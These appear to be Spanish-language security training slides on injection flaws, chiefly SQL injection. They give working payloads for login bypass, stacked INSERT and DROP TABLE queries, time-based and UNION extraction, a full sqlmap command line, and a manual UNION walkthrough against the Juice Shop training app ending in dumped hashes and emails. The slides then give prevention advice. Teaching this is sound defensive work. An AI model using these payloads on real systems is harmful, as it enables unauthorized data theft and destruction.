2013-A1 – Inyección (2017 RC idem)


Inyección significa
    • Engañar a la aplicación para que envíe comandos al interprete

Interpretes...
    • Recibir Strings e interpretarlos como comandos
    • SQL, OS Shell, LDAP, XPath, Hibernate, etc...

Sigue siendo un riesgo muy comun
    • Muchas aplicaciones siguen siendo vulnerables
    • Es simple de evitar

Impacto típico
    • Grave. Toda la base de datos puede ser leida y/o modificada
    • Puede permitir full access a bases de datos, usuarios o OS


2013-A1 – Tipos de Inyección

    Command Injection
    Code Injection
    LDAP Injection
    SQL Injection


Inyección

    • Permite a los atacantes enviar código malicioso a través de la aplicación hacia otros sistemas

    • La mejor forma de detectar si una aplicación es vulnerable a
        inyección es verificar que todos los interpreters separan
        claramente los datos no confiables del comando o consulta

    • Este tipo de ataques incluye llamadas al sistema operativo,
        llamadas a programas desde comandos de Shell o consultas a
        las BD del backend



Inyección SQL
    • El atacante pude ejecutar código SQL malicioso pudiendo modificar
        la Base de Datos de la aplicación afectando su integridad.

    • Puede permitir a un atacante sin acceso autorizado el acceso a
        información sensible.

    • Un atacante debe conseguir un parámetro que llegue hasta la
        base de datos


Inyección SQL

    SELECT id
    FROM logins
    WHERE username = '$username'
    AND password = '$password’

    SELECT id FROM logins WHERE username = 'Mateo'
    AND password = 'cualquiera' OR 'x'='x' ('$password')


    SELECT title, description, body FROM items WHERE ID = 2
        http://newspaper.com/items.php?id=2 and 1=2

    SELECT title, description, body FROM items WHERE ID = 2 and 1=2
        http://newspaper.com/items.php?id=2 and 1=1


    Time Based
    http://www.site.com/vulnerable.php?id=1′ waitfor delay ’00:00:10′–




Buscando usuarios

    SELECT email, passwd, login_id, full_name FROM users
        WHERE email = 'x' OR full_name LIKE '%Mateo%';
            (like is operator "%" and '_' these are two wildcards )


Buscando contraseñas

    SELECT email, passwd, username, full_name  FROM users
        WHERE email = ‘mateo@sqli.com' AND passwd = ‘uruguay2017';
      (not forget ';'  in the end query )



Agregando usuarios

SELECT email, passwd, username, full_name  FROM users WHERE email = 'x';
INSERT INTO users ('email','passwd',‘username','full_name')
VALUES (‘mateo@sqli.com',‘1234',‘mateo',‘Mateo Martinez');--';


      SELECT email, passwd, username, full_name
      FROM users
      WHERE email = 'x';
      INSERT INTO users ('email','passwd',‘username','full_name')
      VALUES (‘mateo@sqli.com',‘1234',‘mateo',‘Mateo Martinez');--';



Borrando la BD

    SELECT email, passwd, username, full_name
    FROM users
    WHERE email = 'x';
    DROP TABLE members; --';   'Ouch!'



Contando Columnas (Union Based)

    Los ataques basados en UNION permiten extraer
    fácilmente información de la base de datos.

    Pero el operador UNION sólo se puede utilizar si ambas
    consultas tienen la misma estructura exacta.

    El atacante debe elaborar una instrucción SELECT
    similar a la consulta original.

    Se debe conocer el nombre de la tabla y se debe determinar también
    el número de columnas y su tipo de datos.


    SELECT name, description, price FROM products WHERE category=1 ORDER BY 2

    SELECT name, description, price
    FROM products
    WHERE category=1
    ORDER BY 2



Descubrir tipos de datos (Union Based)

    SELECT name, description, price
    FROM products
    WHERE category=1
    UNION SELECT 'A', 'B', 3
    FROM all_tables


    En pocas columnas es simple, pero a medida que crece el número de
    columnas se hace más complejo.
    Hay herramientas como SQLMap que automatizan el proceso.



SQL Injection Union Based attack

    SELECT name, description, price
    FROM products
    WHERE category=1
    AND 1=2
    UNION SELECT username, password, 1
    FROM members

    Incorporar una operación lógica falsa le asegura al atacante datos
    limpios del ataque al estar antes del UNION.


Determinar el Tipo de SQL Injection

    • Identificar la Inyección
    • Identificar el tipo de Inyección:
            • STRING
            • NUMERICO


    • Tipo de ataque:
            • Error-Based SQL Injection
            • Union-Based SQL Injection
            • Blind SQL Injection


TOOLS para SQL Injection

    • Mieliekoek.pl (error)
    • Wpoison (error)
    • Sqlmap (blind and union)
    • Sapiti (error)
    • W3af (error)
    • Paros (error)
    • Sqid (error)



Parámetros sqlmap http

     -v: verbosity level
    --url: url a atacar
    --user-agent: Custom User-Agent
    --delay: segundos entre HTTP(S) request
    --timeout: segundos a esperar
    --retries: reintentos despues de timeout
    --keep-alive: conexiones HTTP(s) persistentes
    --threads: HTTP(S) requests concurrentes
    --eta: calcula y muestra el tiempo
    --batch: funcionamiento por defecto



Parámetros sqlmap de auditoría

    --dbms:  define el motor de la BD
    --os:    define el OS del backend
    --level: nivel de test (1 a 5, por defecto 1)
    --risk:  riesgo de los test (1 a 3, por defecto 1)
    --banner: muestra el banner de la BD
    --dbs:   enumera la lista de BD
    --tables: enumera las tablas de la BD
    --technique: Técnicas utilizadas de SQLi


Tipos de ataques sqlmap

    B: Boolean-based blind SQL injection
    E: Error-based SQL injection
    U: UNION query SQL injection
    S: Stacked queries SQL injection
    T: Time-based blind SQL injection


sqlmap.py -v 2 --url=http://mysite.com/index --user-agent=SQLMAP
    --delay=1 --timeout=15 -- retries=2 --keep-alive --threads=5
    --eta --batch --dbms=MySQL --os=Linux --level=5 --risk=4
    --banner --is-dba --dbs --tables --technique=BEUST-s /tmp/scan_report.txt
    --flush-session -t /tmp/scan_trace.txt --fresh-queries >
    /tmp/scan_out.txt

sqlmap  resumen the following injection point(s)  from stored session
---
Parameter: q (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: q=prueba ')) UNION ALL SELECT NULL , qjkvq' ||
        'ElkjhflhjfdssfueadGYEJKSGjh'


    Vamos a intentar de avanzar con UNION pero en forma manual sobre
    el formulario de búsqueda.

    El primer paso va a ser pegar el resultado del payload de SQLMap
    en nuestro campo de  búsqueda.

        Aqui nos dara un resulatado de los datos adqueridos



' )) union select 1,2,3,4,5,6,7,8 ; --

    XXX' )) union select 1,name,name,4,5,6,7,8
    FROM sqlite_master
    WHERE type = 'table' ; --


    XXX' )) union select 1,sql,sql,4,5,6,7,8
    FROM sqlite_master
    WHERE tbl_name = 'Users' AND type = 'table' ; --


    XXX' )) union select id,password,email,4,5,6,7,8
    FROM Users ; --


    0192023a7bbd73250516f069df18b500 admin@juice-sh.op admin123
    e541ca7ecf72b8d1286474fc613e5e45 jim@juice-sh.op ncc-1701
    0c36e517e3fa95aabf1bbffc6744a4ef bender@juice-sh.op ??????
    448af65cf28e8adeab7ebb1ecff66f15 bjoern.kimminich@googlemail.com
    861917d5fa5f1172f931dc700d81a8fb ciso@juice-sh.op
    d57386e76107100a7d6c2782978b2e7b support@juice-sh.op



A1 – Evitando Inyecciones

Recomendaciones

    • Evitar el acceso al Interprete
    • Utilizar interfaces que utilice bind variables
            (como prepared statements, o stored procedures),
    • Bind variables permite al interprete distinguir entre código y datos
    • Codificar los inputs de usuario antes de pasarlos al interprete
    • “White list” para los datos del usuario (cuando se pueda)
    • Utilizar siempre privilegios mínimos en la BD


Referencias
    • https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
